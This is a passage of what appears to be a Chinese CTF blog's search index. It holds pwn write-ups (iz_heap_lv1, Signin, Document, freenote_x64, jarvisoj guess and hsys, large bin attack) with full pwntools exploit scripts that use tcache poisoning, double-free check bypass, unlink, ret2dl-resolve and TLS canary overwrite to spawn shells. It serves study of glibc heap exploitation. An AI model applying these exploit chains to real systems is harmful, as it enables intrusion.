sh.sendafter(&#x27;Give your description : &#x27;,payload)    #dl-runtime-resolve  #真正的dynsym的起始地址  dynsym_addr = 0x80481D8  #真正的dynstr的地址  dynstr = 0x80481D8  #调用dll_runtime_resolve处  plt_load = 0x8048456    #我们准备把link_map放置在bss+0x20处  fake_link_map_addr = bss + 0x600  #假的dyn_strtab  fake_dyn_strtab_addr = fake_link_map_addr + 0x4  fake_dyn_strtab = p32(0) + p32(dynstr) #fake_link_map_addr + 0x8  #假的dyn_symtab，我们要让对应的dynsym里的st_value指向一个已经解析过的函数的got表  #其他字段无关紧要，所以，我们让dynsym为read_got - 0x4，这样，相当于把read_got - 0x4处开始当做一个dynsym，这样st_value正好对应了read的地址  #并且(*(sym+5))&amp;0x03 != 0也成立  fake_dyn_symtab_addr = fake_link_map_addr + 0xC  fake_dyn_symtab = p32(0) + p32(read_got - 0x4) #fake_link_map_addr + 0xC  #假的dyn_rel  fake_dyn_rel_addr = fake_link_map_addr + 0x14  fake_dyn_rel = p32(0) + p32(fake_link_map_addr + 0x1C) #fake_link_map_addr + 0x14  #假的rel.plt  fake_rel = p32(r_offset) + p32(0x7) + p32(0) #fake_link_map_addr + 0x1C  #l_addr  fake_link_map = p32(l_addr)  #由于link_map的中间部分在我们的攻击中无关紧要，所以我们把伪造的几个数据结构也放当中  fake_link_map += fake_dyn_strtab  fake_link_map += fake_dyn_symtab  fake_link_map += fake_dyn_rel  fake_link_map += fake_rel  fake_link_map = fake_link_map.ljust(0x34,&#x27;\\x00&#x27;)  #dyn_strtab的指针  fake_link_map += p32(fake_dyn_strtab_addr)  #dyn_strsym的指针  fake_link_map += p32(fake_dyn_symtab_addr) #fake_link_map_addr + 0x38  #存入/bin/sh字符串  fake_link_map += &#x27;/bin/sh&#x27;.ljust(0x40,&#x27;\\x00&#x27;)  #在fake_link_map_addr + 0x7C处，是rel.plt指针  fake_link_map += p32(fake_dyn_rel_addr)    #栈迁移后，我们再继续迁移一次，扩大空间，为dl-resolve做准备  payload1 = &#x27;a&#x27;*0xDC + p32(pop_ebp) + p32(bss + 0x800) + p32(read_plt) + p32(leave_ret) + p32(0) + p32(bss + 0x600) + p32(0x1000)  #第一次，我们做栈迁移，同时继续调用read读取下一轮数据  sh.sendlineafter(&#x27;Give your postscript : &#x27;,payload1)  #mmap一个合适堆，在glibc2.23下可以分配到TLS结构上方附近  sh.sendlineafter(&#x27;Give your notebook size : &#x27;,str(1024*130))  overflow_len = 0x216FC  #初始化v4  sh.sendlineafter(&#x27;Give your title size : &#x27;,str(overflow_len))  sh.sendlineafter(&#x27;invalid ! please re-enter :&#x27;,&#x27;1&#x27;)  sh.sendafter(&#x27;Give your title : &#x27;,&#x27;a&#x27;)  #绕过canary的重点在这里，将TLS里的canary覆盖为aaaa  #raw_input()  sh.sendafter(&#x27;Give your note :&#x27;,&#x27;aaaa&#x27;)    #第二次，我们发送伪造的数据结构和dl-resolve的rop  rop = &#x27;\\x00&#x27;*0x4 + p32(plt_load) + p32(fake_link_map_addr) + p32(0) + &#x27;aaaa&#x27;  payload = fake_link_map.ljust(0x200,&#x27;\\x00&#x27;) + rop  sh.sendline(payload)    sh.interactive()  ","categories":["CTF"],"tags":["栈溢出","ROP","ret2dl","TLS覆盖"]},{"title":"iz_heap_lv1","url":"/2020/07/01/iz_heap_lv1/","content":"首先，检查一下程序的保护机制\n\n\n然后，我们用IDA分析一下，delete功能里存在数组下标越界，可以free掉第21个堆指针，而第21个位置对应name的空间\n\n\n\n\n因此，我们可以在name里伪造一个chunk，free掉以后后续利用即可。\n#coding:utf8from pwn import *#sh = process(&#x27;./iz_heap_lv1&#x27;)sh = remote(&#x27;node3.buuoj.cn&#x27;,29203)libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc-2.27.so&#x27;)malloc_hook_s = libc.symbols[&#x27;__malloc_hook&#x27;]free_hook_s = libc.symbols[&#x27;__free_hook&#x27;]system_s = libc.sym[&#x27;system&#x27;]fake_chunk = p64(0x0000000000602110) + p64(0x91)fake_chunk += &#x27;a&#x27;*0x80fake_chunk += (p64(0) + p64(0x21) + &#x27;a&#x27;*0x10)*2sh.sendlineafter(&#x27;name:&#x27;,fake_chunk)def add(size,content):   sh.sendlineafter(&#x27;Choice:&#x27;,&#x27;1&#x27;)   sh.sendlineafter(&#x27;size:&#x27;,str(size))   sh.sendafter(&#x27;data:&#x27;,content)def edit(index,size,content):   sh.sendlineafter(&#x27;Choice:&#x27;,&#x27;2&#x27;)   sh.sendlineafter(&#x27;index:&#x27;,str(index))   sh.sendlineafter(&#x27;size:&#x27;,str(size))   sh.sendafter(&#x27;data:&#x27;,content)def delete(index):   sh.sendlineafter(&#x27;Choice:&#x27;,&#x27;3&#x27;)   sh.sendlineafter(&#x27;index:&#x27;,str(index))def show_name():   sh.sendlineafter(&#x27;Choice:&#x27;,&#x27;4&#x27;)for i in range(7):   add(0x7F,&#x27;a&#x27;*0x10)for i in range(7):   delete(i)delete(20) #越界，free伪造的chunkshow_name()sh.sendlineafter(&#x27;edit:&#x27;,&#x27;Y&#x27;)sh.sendafter(&#x27;name:&#x27;,&#x27;a&#x27;*0x10)sh.recvuntil(&#x27;a&#x27;*0x10)main_arena_xx = u64(sh.recv(6).ljust(8,&#x27;\\x00&#x27;))malloc_hook_addr = (main_arena_xx &amp; 0xFFFFFFFFFFFFF000) + (malloc_hook_s &amp; 0xFFF)libc_base = malloc_hook_addr - malloc_hook_sfree_hook_addr = libc_base + free_hook_ssystem_addr = libc_base + system_sprint &#x27;libc_base=&#x27;,hex(libc_base)print &#x27;free_hook_addr=&#x27;,hex(free_hook_addr)print &#x27;system_addr=&#x27;,hex(system_addr)show_name()sh.sendlineafter(&#x27;edit:&#x27;,&#x27;Y&#x27;)sh.sendafter(&#x27;name:&#x27;,p64(0) + p64(0x91))add(0x20,&#x27;a&#x27;*0x20)delete(0)show_name()sh.sendlineafter(&#x27;edit:&#x27;,&#x27;Y&#x27;)sh.sendafter(&#x27;name:&#x27;,p64(0) + p64(0x31) + p64(free_hook_addr))add(0x20,&#x27;/bin/sh\\x00&#x27;)add(0x20,p64(system_addr))#getshelldelete(0)sh.interactive()","categories":["CTF"],"tags":["tcache","下标越界"]},{"title":"Signin(calloc不从tcache里取chunk)","url":"/2020/02/26/i%E6%98%A5%E7%A7%8B2020%E6%96%B0%E6%98%A5%E6%88%98%E5%BD%B9signin/","content":"首先，检查一下程序的保护机制\n\n\n然后，我们用IDA分析一下，存在一个后门函数，要执行后面函数，需要ptr不为0\n\n\n\n\nDelete功能没有清空指针\n\n\nEdit功能存在UAF漏洞，但**[edit功能只能使用一次]{.mark}**\n\n\n测试出题目给我们的glibc版本为2.29，存在tcahce机制。\n由于edit功能只用一次。同时，我们注意到后门里函数使用了calloc。\n\n\n通过阅读glibc2.29源码，我们得知**[calloc不会从tcache bin里取空闲的chunk，而是从fastbin里取，取完后，和malloc一样，如果fastbin里还有剩余的chunk，则全部放到对应的tcache bin里取，采用头插法]{.mark}**\n  if ((unsigned long) (nb) &lt;= (unsigned long) (get_max_fast ()))      &#123;        idx = fastbin_index (nb);        mfastbinptr *fb = &amp;fastbin (av, idx);        mchunkptr pp;        victim = *fb;          if (victim != NULL)      &#123;        if (SINGLE_THREAD_P)          *fb = victim-&gt;fd;        else          REMOVE_FB (fb, pp, victim);        if (__glibc_likely (victim != NULL))          &#123;            size_t victim_idx = fastbin_index (chunksize (victim));            if (__builtin_expect (victim_idx != idx, 0))                malloc_printerr (&quot;malloc(): memory corruption (fast)&quot;);            check_remalloced_chunk (av, victim, nb);  #if USE_TCACHE            /* While we&#x27;re here, if we see other chunks of the same size,          stash them in the tcache.  */            size_t tc_idx = csize2tidx (nb);            if (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)          &#123;            mchunkptr tc_victim;              /* While bin not empty and tcache not full, copy chunks.  */            while (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count              &amp;&amp; (tc_victim = *fb) != NULL)              &#123;                if (SINGLE_THREAD_P)                 *fb = tc_victim-&gt;fd;                else                &#123;                  REMOVE_FB (fb, pp, tc_victim);                  if (__glibc_unlikely (tc_victim == NULL))                    break;                &#125;                tcache_put (tc_victim, tc_idx);              &#125;          &#125;  #endif            void *p = chunk2mem (victim);            alloc_perturb (p, bytes);            return p;          &#125;      &#125;      &#125;  \n\n那么，我们可以利用一次edit，把ptr-0x10链接到fastbin里去，然后调用后面函数执行calloc从fastbin里取出一个chunk，然后剩余的chunk全部放到对应的tcache bin里去。[由于采用的是头插法插入，那么(ptr-0x10)-&gt;fd &#x3D; heap_x_addr]{.mark}，这样，也就是ptr被写了一个堆的地址，不为0了，那么接下来就会执行system(“&#x2F;bin&#x2F;sh”)了。\n综上，我们的exp脚本\n#coding:utf8  from pwn import *    sh = process(&#x27;./signin&#x27;)  ptr = 0x4040C0    def create(index):     sh.sendlineafter(&#x27;your choice?&#x27;,&#x27;1&#x27;)     sh.sendlineafter(&#x27;idx?&#x27;,str(index))    def edit(index,content):     sh.sendlineafter(&#x27;your choice?&#x27;,&#x27;2&#x27;)     sh.sendlineafter(&#x27;idx?&#x27;,str(index).ljust(0xE,&#x27;\\x00&#x27;))     sh.send(content)    def delete(index):     sh.sendlineafter(&#x27;your choice?&#x27;,&#x27;3&#x27;)     sh.sendlineafter(&#x27;idx?&#x27;,str(index))  #申请8个堆  for i in range(8):     create(i)    #释放8个堆，7个进tcache,1个进fastbin  for i in range(8):     delete(i)  #从tcache里取出一个,则还剩下6个  create(8)  edit(7,p64(ptr - 0x10))  #getshell  sh.sendlineafter(&#x27;your choice?&#x27;,&#x27;6&#x27;)    sh.interactive()","categories":["CTF"],"tags":["tcache","UAF","fastbin","calloc"]},{"title":"i春秋新春战役之Document(修改key指针绕过glibc2.29 tcache的double free检测)","url":"/2020/02/27/i%E6%98%A5%E7%A7%8B%E6%96%B0%E6%98%A5%E6%88%98%E5%BD%B9%E4%B9%8BDocument/","content":"首先，检查一下程序的保护机制\n\n\n然后，我们用IDA分析一下，经典的增删改查程序\n\n\nDelete功能没有清空指针，存在UAF漏洞\n\n\nCreate功能的size不可控\n\n\nUAF无法修改到*heap处的内容，也就是next指针的值\n\n\nCreate功能最多允许创建7个堆\n\n\n题目给我们的glibc版本为2.29，存在tcache机制，且增加了对tcache double free的检查。\ntypedef struct tcache_entry  &#123;    /*指向下一个空闲chunk*/    struct tcache_entry *next;    /* 用来检测double free*/    struct tcache_perthread_struct *key;  &#125; tcache_entry;  \n\n让我们来看看是如何检测的吧\n/* Check to see if it&#x27;s already in the tcache.  */  tcache_entry *e = (tcache_entry *) chunk2mem (p);    /* This test succeeds on double free.  However, we don&#x27;t 100%    trust it (it also matches random payload data at a 1 in    2^&lt;size_t&gt; chance), so verify it&#x27;s not an unlikely    coincidence before aborting.  */  if (__glibc_unlikely (e-&gt;key == tcache)) &#123;      tcache_entry *tmp;      LIBC_PROBE (memory_tcache_double_free, 2, e, tc_idx);      for (tmp = tcache-&gt;entries[tc_idx];              tmp;              tmp = tmp-&gt;next)          if (tmp == e)              malloc_printerr (&quot;free(): double free detected in tcache 2&quot;);      /* If we get here, it was a coincidence.  We&#x27;ve wasted a        few cycles, but don&#x27;t abort.  */  &#125;  \n\n显然，[如果我们让e-&gt;key &#x3D;&#x3D; tcache不成立，就能够double free了。]{.mark}\n而之前，我们分析了edit函数，changeSex功能可以修改key指针的低1字节，那么就能使得这个不再成立。于是，我们先用double free来将0x90的tcache bin填满7个。\n#0  create(&#x27;a&#x27;*0x8,&#x27;a&#x27;*0x70)  #1  create(&#x27;b&#x27;*0x8,&#x27;b&#x27;*0x70)  #2  create(&#x27;c&#x27;*0x8,&#x27;c&#x27;*0x70)  #3  create(&#x27;d&#x27;*0x8,&#x27;d&#x27;*0x70)    delete(0)  #修改key，偏移1，绕过了double free检查  edit(0,&#x27;a&#x27;*0x70)  delete(0)    delete(1)  edit(1,&#x27;a&#x27;*0x70)    delete(2)  #修改key，偏移1，绕过了double free检查  edit(2,&#x27;a&#x27;*0x70)  delete(2)    delete(3)  #修改key，偏移1，绕过了double free检查  edit(3,&#x27;a&#x27;*0x70)  delete(3)  \n\n接下来，继续delete，就能将chunk放入unsorted bin了，再利用UAF泄露地址。\n#由于前面，把tcache给填满了，现在这个就放入unsorted bin里  delete(1)  show(1)    sh.recvuntil(&#x27;\\n&#x27;)  main_arena_88 = u64(sh.recvuntil(&#x27;\\n&#x27;,drop = True).ljust(8,&#x27;\\x00&#x27;))  malloc_hook_addr = (main_arena_88 &amp; 0xFFFFFFFFFFFFF000) + (malloc_hook_s &amp; 0xFFF)  libc_base = malloc_hook_addr - malloc_hook_s  free_hook_addr = libc_base + free_hook_s  system_addr = libc_base + system_s  print &#x27;libc_base=&#x27;,hex(libc_base)  print &#x27;free_hook_addr=&#x27;,hex(free_hook_addr)  print &#x27;system_addr=&#x27;,hex(system_addr)  \n\n现在，堆布局是这样的\n\n\n那么，就能很容易利用了。我们的完整exp脚本\n#coding:utf8  from pwn import *    sh = process(&#x27;./document&#x27;)  #sh = remote(&#x27;node3.buuoj.cn&#x27;,26208)  libc = ELF(&#x27;/usr/lib/x86_64-linux-gnu/libc-2.29.so&#x27;)  malloc_hook_s = libc.symbols[&#x27;__malloc_hook&#x27;]  free_hook_s = libc.symbols[&#x27;__free_hook&#x27;]  system_s = libc.sym[&#x27;system&#x27;]    def create(name,content):     sh.sendlineafter(&#x27;Give me your choice :&#x27;,&#x27;1&#x27;)     sh.sendafter(&#x27;input name&#x27;,name)     sh.sendafter(&#x27;input sex&#x27;,&#x27;M&#x27;)     sh.sendafter(&#x27;input information&#x27;,content)    def show(index):     sh.sendlineafter(&#x27;Give me your choice :&#x27;,&#x27;2&#x27;)     sh.sendlineafter(&#x27;Give me your index :&#x27;,str(index))    def edit(index,content,changeSex = &#x27;Y&#x27;):     sh.sendlineafter(&#x27;Give me your choice :&#x27;,&#x27;3&#x27;)     sh.sendlineafter(&#x27;Give me your index :&#x27;,str(index))     #这一步至关重要     sh.sendafter(&#x27;Are you sure change sex?&#x27;,changeSex)     sh.sendafter(&#x27;Now change information&#x27;,content)    def delete(index):     sh.sendlineafter(&#x27;Give me your choice :&#x27;,&#x27;4&#x27;)     sh.sendlineafter(&#x27;Give me your index :&#x27;,str(index))    #0  create(&#x27;a&#x27;*0x8,&#x27;a&#x27;*0x70)  #1  create(&#x27;b&#x27;*0x8,&#x27;b&#x27;*0x70)  #2  create(&#x27;c&#x27;*0x8,&#x27;c&#x27;*0x70)  #3  create(&#x27;d&#x27;*0x8,&#x27;d&#x27;*0x70)    delete(0)  #修改key，偏移1，绕过了double free检查  edit(0,&#x27;a&#x27;*0x70)  delete(0)    delete(1)  edit(1,&#x27;a&#x27;*0x70)    delete(2)  #修改key，偏移1，绕过了double free检查  edit(2,&#x27;a&#x27;*0x70)  delete(2)    delete(3)  #修改key，偏移1，绕过了double free检查  edit(3,&#x27;a&#x27;*0x70)  delete(3)    #由于前面，把tcache给填满了，现在这个就放入unsorted bin里  delete(1)  show(1)    sh.recvuntil(&#x27;\\n&#x27;)  main_arena_88 = u64(sh.recvuntil(&#x27;\\n&#x27;,drop = True).ljust(8,&#x27;\\x00&#x27;))  malloc_hook_addr = (main_arena_88 &amp; 0xFFFFFFFFFFFFF000) + (malloc_hook_s &amp; 0xFFF)  libc_base = malloc_hook_addr - malloc_hook_s  free_hook_addr = libc_base + free_hook_s  system_addr = libc_base + system_s  print &#x27;libc_base=&#x27;,hex(libc_base)  print &#x27;free_hook_addr=&#x27;,hex(free_hook_addr)  print &#x27;system_addr=&#x27;,hex(system_addr)    #将free_hook_addr链接到tcache bin  create(p64(free_hook_addr),&#x27;a&#x27;*0x70) #4  create(&#x27;/bin/sh\\x00&#x27;,&#x27;a&#x27;*0x70) #5  #写free_hook  create(p64(system_addr),&#x27;a&#x27;*0x70) #6  #getshell  delete(5)    sh.interactive()  ","categories":["CTF"],"tags":["tcache","UAF","glibc 2.29"]},{"title":"jarvisoj_freenote_x64","url":"/2020/04/17/jarvisoj_freenote_x64/","content":"首先，检查一下程序的保护机制\n\n\n然后，我们用IDA分析一下，delete功能清空了标记但是，没有清空指针，使得可以多次free。\n\n\n由于清空了标记，因此这个UAF只能用来double free。\n用于输入的函数会输完a2个字符为止，会将堆里的指针覆盖掉，因此也无法直接泄露地址。\n\n\n由此想到的方法就是构造overlap chunk，我们注意到edit函数里使用了realloc函数\n\n\nrealloc会重新分配堆空间，如果后一个chunk处于unsorted bin，会合并进来后再切割。因此，如果后一个chunk的指针保留在堆指针数组里，然后我们realloc当前的chunk，就可以把后一个chunk包含进来，进而可以泄露下一个chunk的里保留的地址信息，然后就是伪造下一个chunk的头，利用UAF再次释放下一个chunk，unlink后控制堆指针数组。\n#coding:utf8from pwn import *#sh = process(&#x27;./freenote_x64&#x27;)sh = remote(&#x27;node3.buuoj.cn&#x27;,27557)libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc-2.23.so&#x27;)malloc_hook_s = libc.symbols[&#x27;__malloc_hook&#x27;]free_hook_s = libc.symbols[&#x27;__free_hook&#x27;]system_s = libc.sym[&#x27;system&#x27;]binsh_s = libc.search(&#x27;/bin/sh&#x27;).next()def show():   sh.sendlineafter(&#x27;Your choice:&#x27;,&#x27;1&#x27;)def add(size,content):   sh.sendlineafter(&#x27;Your choice:&#x27;,&#x27;2&#x27;)   sh.sendlineafter(&#x27;Length of new note:&#x27;,str(size))   sh.sendafter(&#x27;Enter your note:&#x27;,content)def edit(index,size,content):   sh.sendlineafter(&#x27;Your choice:&#x27;,&#x27;3&#x27;)   sh.sendlineafter(&#x27;Note number:&#x27;,str(index))   sh.sendlineafter(&#x27;Length of note:&#x27;,str(size))   sh.sendafter(&#x27;Enter your note:&#x27;,content)def delete(index):   sh.sendlineafter(&#x27;Your choice:&#x27;,&#x27;4&#x27;)   sh.sendlineafter(&#x27;Note number:&#x27;,str(index))#0add(0x80,&#x27;a&#x27;*0x80)#1add(0x80,&#x27;b&#x27;*0x80)#2add(0x80,&#x27;c&#x27;*0x80)#3add(0x80,&#x27;d&#x27;*0x80)#将1、2释放delete(1)delete(2)#realloc将1包含到0里去，这样，我们就可以读取1里的数据#这里实际realloc的大小为0x100，而只需要输入0x90，所以可以泄露后面1的fd的内容edit(0,0x90,&#x27;a&#x27;*0x90)#libc地址show()sh.recvuntil(&#x27;a&#x27;*0x90)main_arena_88 = u64(sh.recv(6).ljust(8,&#x27;\\x00&#x27;))malloc_hook_addr = (main_arena_88 &amp; 0xFFFFFFFFFFFFF000) + (malloc_hook_s &amp; 0xFFF)libc_base = malloc_hook_addr - malloc_hook_sfree_hook_addr = libc_base + free_hook_ssystem_addr = libc_base + system_sbinsh_addr = libc_base + binsh_sprint &#x27;libc_base=&#x27;,hex(libc_base)print &#x27;free_hook_addr=&#x27;,hex(free_hook_addr)print &#x27;system_addr=&#x27;,hex(system_addr)#在1、2中伪造fastbin chunk用于泄露堆地址fake_chunk = p64(0) + p64(0x21)fake_chunk += &#x27;a&#x27;*0x10payload = &#x27;a&#x27;*0x80payload += fake_chunk*2payload = payload.ljust(0x118,&#x27;a&#x27;)#3的size的prev_inuse设置为1，因为unlink时要检查payload += p64(0x21)payload = payload.ljust(0x180,&#x27;a&#x27;)edit(0,0x180,payload)#1链入fastbindelete(1)#利用同样的方法，泄露出1的fd数据edit(0,0x90,&#x27;a&#x27;*0x90)show()sh.recvuntil(&#x27;a&#x27;*0x90)heap_addr = u64(sh.recvuntil(&#x27;\\n&#x27;,drop = True).ljust(8,&#x27;\\x00&#x27;))heap_0_ptr_addr = heap_addr - 0x1980print &#x27;heap_0_ptr_addr=&#x27;,hex(heap_0_ptr_addr)#在0中伪造chunkfake_chunk = p64(0) + p64(0x81)#fd、bkfake_chunk += p64(heap_0_ptr_addr - 0x18) + p64(heap_0_ptr_addr - 0x10)payload = fake_chunk.ljust(0x80,&#x27;a&#x27;)#修改1中的头payload += p64(0x80) + p64(0x90)payload = payload.ljust(0x100,&#x27;a&#x27;)edit(0,0x100,payload)#unlinkdelete(1)#现在可以控制堆指针数组了payload = p64(10)payload += p64(1) + p64(0x8) + p64(free_hook_addr)payload += p64(1) + p64(0x8) + p64(binsh_addr)payload = payload.ljust(0x100,&#x27;\\x00&#x27;)edit(0,0x100,payload)#改写free_hookedit(0,0x8,p64(system_addr))#getshelldelete(1)sh.interactive()","categories":["CTF"],"tags":["unlink","UAF","realloc"]},{"title":"jarvisoj_guess(下标越界导致盲注)","url":"/2020/06/11/jarvisoj_guess/","content":"首先，检查一下程序的保护机制\n\n\n然后，我们用IDA分析一下，转换的时候没有检查flag_hex[2i]和flag_hex[2i+1]的值是否向上越界，如果向上越界，我们可以令flag_hex[i]为’0’，而flag_hex[i+1]为p8(offset)，这样s[i] &#x3D; value2 | 16 * value1的值就是value2就是bin_by_hex[flag_hex[2*i+1]]也就是bin_by_hex[offset]，那么如果取到上面v4的内容，就能通过比较。\n\n\n然后，我们就可以单字节爆破了\n#coding:utf8from pwn import *#预先生成一个可以pass的payloadpayload = &#x27;&#x27;for i in range(50):   payload += &#x27;0&#x27;   payload += p8(0x100-0x40 + i)sh = remote(&#x27;node3.buuoj.cn&#x27;,28532)#接下来，就可以逐字节爆破了flag = &#x27;&#x27;for i in range(1,51):   print &quot;guess the index &#123;&#125;&#x27;s char&quot;.format(i)   for c in range(32,128):      pay = payload[0:2*i-2] + hex(c)[2:] + payload[2*i:]      #print pay      #sh = remote(&#x27;127.0.0.1&#x27;,9999)      sh.sendlineafter(&#x27;guess&gt; &#x27;,pay)      ans = sh.recvuntil(&#x27;\\n&#x27;)      if &#x27;Yaaaay!&#x27; in ans:         flag += chr(c)         break   print &#x27;flag=&#x27;,flagsh.close()\n","categories":["CTF"],"tags":["下标越界","盲注"]},{"title":"jarvisoj_hsys(hash散列表)","url":"/2020/07/25/jarvisoj_hsys/","content":"首先，检查一下程序的保护机制\n\n\n然后，我们用IDA分析一下，在show功能里，如果cur_id为0，即admin账户，则v36为定值5，这样使得n变大，memcpy就有可能造成栈溢出，如果能让name长一些，那么info的内容就可以溢出更多一点。\n\n\n为了寻找这样的name，首先要求hash(name) &#x3D; 0,并且strlen(name)尽可能大，我们来看看hash计算的方法。\n\n\n首先是利用一个hash函数生成一个hash初值，接着为了解决hash冲突，依次在ptr里寻找空闲的位置，但是没有检查hash表是否已经满了，因此如果这1338个空间都满了的话，id就直接等于hash(name)。\n因此，将该hash函数提取出来，爆破一个字符串\n\n\n#include &lt;stdio.h&gt;#include &lt;cstring&gt;#include &lt;string&gt;#include &lt;iostream&gt;using namespace std;unsigned int hashid(string name) &#123;    unsigned int len = name.length();    unsigned int j=0;    int i;    unsigned int k;    for(i=0; i&lt;len; i++) &#123;        k = 0x401*(name[i]+j);        j = (k&gt;&gt;6)^k;    &#125;    unsigned int ret;    ret = (0x8001 * (((9*j)&gt;&gt;11)^9*j))%1337;    return ret;&#125;int main(void) &#123;    string a = &quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot;;    string b;    for(int i=&#x27;a&#x27;; i&lt;&#x27;z&#x27;; i++) &#123;        for(char j=&#x27;a&#x27;; j&lt;&#x27;z&#x27;; j++) &#123;            for(char m=&#x27;a&#x27;; m&lt;&#x27;z&#x27;; m++) &#123;                for(char n=&#x27;a&#x27;; n&lt;&#x27;z&#x27;; n++) &#123;                    b=a;                    b+=i;                    b+=j;                    b+=m;                    b+=n;                    if(hashid(b) == 0) &#123;                        cout&lt;&lt;b&lt;&lt;endl;                        return 0;                    &#125;                &#125;            &#125;        &#125;    &#125;    return 0;&#125;\n\n再次注意到add_hacker函数，仅仅是在数组最后添加了一个0，没有对字符串结尾添加0，因此，可以用来泄露堆里面的main_arena指针，从而得到libc地址。\n\n\n#coding:utf8from pwn import *#sh = process(&#x27;./hsys&#x27;,env=&#123;&#x27;LD_PRELOAD&#x27;:&#x27;./libc-2.23_x86.so&#x27;&#125;)sh = remote(&#x27;node3.buuoj.cn&#x27;,27475)libc = ELF(&#x27;./libc-2.23_x86.so&#x27;)malloc_hook_s = libc.symbols[&#x27;__malloc_hook&#x27;]#context.log_level = &#x27;debug&#x27;#填满hash表，由于次数太多远程超时，我们一次性发送payload到远程缓冲区payload = &#x27;&#x27;for i in range(1337):   payload += &#x27;add &#x27; + str(i) + &#x27;\\n&#x27;   #sh.sendlineafter(&#x27;&gt;&gt;&#x27;,&#x27;add &#x27; + str(i))sh.sendlineafter(&#x27;&gt;&gt;&#x27;,payload)sh.sendlineafter(&#x27;&gt;&gt;&#x27;,&#x27;add haivk&#x27;) #0sh.sendlineafter(&#x27;&gt;&gt;&#x27;,&#x27;add haivk2&#x27;) #1sh.sendlineafter(&#x27;&gt;&gt;&#x27;,&#x27;add haivk&#x27;) #取回0sh.sendlineafter(&#x27;&gt;&gt;&#x27;,&#x27;info &#x27; + &#x27;a&#x27;*0x80) #申请一个unsorted bin范围的chunksh.sendlineafter(&#x27;&gt;&gt;&#x27;,&#x27;add haivk&#x27;)sh.sendlineafter(&#x27;&gt;&gt;&#x27;,&#x27;info &#x27; + &#x27;a&#x27;*0x200) #将前一个unsorted bin释放sh.sendlineafter(&#x27;&gt;&gt;&#x27;,&#x27;add a&#x27;)sh.sendlineafter(&#x27;&gt;&gt;&#x27;,&#x27;show&#x27;)sh.recvuntil(&#x27;Name: &#x27;)main_arena_88 = u32(sh.recv(4))malloc_hook_addr = (main_arena_88 &amp; 0xFFFFF000) + (malloc_hook_s &amp; 0xFFF)libc_base = malloc_hook_addr - malloc_hook_ssystem_addr = libc_base + libc.sym[&#x27;system&#x27;]binsh_addr = libc_base + libc.search(&#x27;/bin/sh&#x27;).next()print &#x27;libc_base=&#x27;,hex(libc_base)print &#x27;system_addr=&#x27;,hex(system_addr)print &#x27;binsh_addr=&#x27;,hex(binsh_addr)payload = &#x27;a&#x27;*0x3A + p32(system_addr) + &#x27;a&#x27;*0x4 + p32(binsh_addr)sh.sendlineafter(&#x27;&gt;&gt;&#x27;,&#x27;add aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabx&#x27;) #id=0sh.sendlineafter(&#x27;&gt;&gt;&#x27;,&#x27;info &#x27; + payload)sh.sendlineafter(&#x27;&gt;&gt;&#x27;,&#x27;show&#x27;) #栈溢出sh.sendlineafter(&#x27;&gt;&gt;&#x27;,&#x27;exit&#x27;)sh.interactive()","categories":["CTF"],"tags":["栈溢出","爆破","libc地址泄漏"]},{"title":"large bin attack & house of strom","url":"/2020/06/11/large_bin_attack_house_of_strom/","content":"large bin attack是一种堆利用手法，而house of strom则是在large bin attack的基础上借用unsorted bin来达到任意地址分配，首先我们从源码入手来分析large bin attack原理，然后再讲讲house of strom的原理，接着再看几个题目。\n为例方便分析，以2.23为例，新版本有tcache的情况类似，只需填满tcache bin绕过tcache即可。\n在free的时候，chunk要么被放入fastbin，要么就被放到unsorted bin。当我们再次malloc的时候，[如果对unsorted bin做了遍历，unsorted bin里的chunk才会被放到对应的bin里]{.mark}，比如large bin、small bin。比如我在unsorted bin里有一个size为0x420的chunk，那么它会被放到对应的large bin里。而large bin attack就是利用了unsorted bin里未归位的chunk插入到large bin时的解链、成链操作。来看一段malloc中的源码\n1.\tfor (;; )  2.\t   &#123;  3.\t     int iters = 0;  4.\t     while ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av)) //遍历unsorted bin  5.\t       &#123;  6.\t         bck = victim-&gt;bk;  7.\t         if (__builtin_expect (victim-&gt;size &lt;= 2 * SIZE_SZ, 0)  8.\t             || __builtin_expect (victim-&gt;size &gt; av-&gt;system_mem, 0))  9.\t           malloc_printerr (check_action, &quot;malloc(): memory corruption&quot;,  10.\t                            chunk2mem (victim), av);  11.\t         size = chunksize (victim); //获得当前unsorted bin chunk的大小  12.\t  13.\t         ..........................  14.\t  15.\t         if (in_smallbin_range (size))  16.\t           &#123;  17.\t             victim_index = smallbin_index (size);  18.\t             bck = bin_at (av, victim_index);  19.\t             fwd = bck-&gt;fd;  20.\t           &#125;  21.\t         else //属于large bin范围  22.\t           &#123;  23.\t             victim_index = largebin_index (size); //根据size，得到对应的large bin索引  24.\t             bck = bin_at (av, victim_index); //获取对应索引的large bin里的最后一个chunk  25.\t             fwd = bck-&gt;fd; //获得对应索引的large bin的第一个chunk  26.\t  27.\t             /* maintain large bins in sorted order */  28.\t             if (fwd != bck) //这意味着当前索引的large bin里chunk不为空  29.\t               &#123;  30.\t                 /* Or with inuse bit to speed comparisons */  31.\t                 size |= PREV_INUSE;  32.\t                 /* if smaller than smallest, bypass loop below */  33.\t                 assert ((bck-&gt;bk-&gt;size &amp; NON_MAIN_ARENA) == 0);  34.\t                 if ((unsigned long) (size) &lt; (unsigned long) (bck-&gt;bk-&gt;size))  35.\t                   &#123;  36.\t                     fwd = bck;  37.\t                     bck = bck-&gt;bk;  38.\t  39.\t                     victim-&gt;fd_nextsize = fwd-&gt;fd;  40.\t                     victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;  41.\t                     fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;  42.\t                   &#125;  43.\t                 else  44.\t                   &#123;  45.\t                     assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == 0);  46.\t                     while ((unsigned long) size &lt; fwd-&gt;size)  47.\t                       &#123;  48.\t                         fwd = fwd-&gt;fd_nextsize;  49.\t                         assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == 0);  50.\t                       &#125;  51.\t  52.\t                     if ((unsigned long) size == (unsigned long) fwd-&gt;size)  53.\t                       /* Always insert in the second position.  */  54.\t                       fwd = fwd-&gt;fd;  55.\t                     else 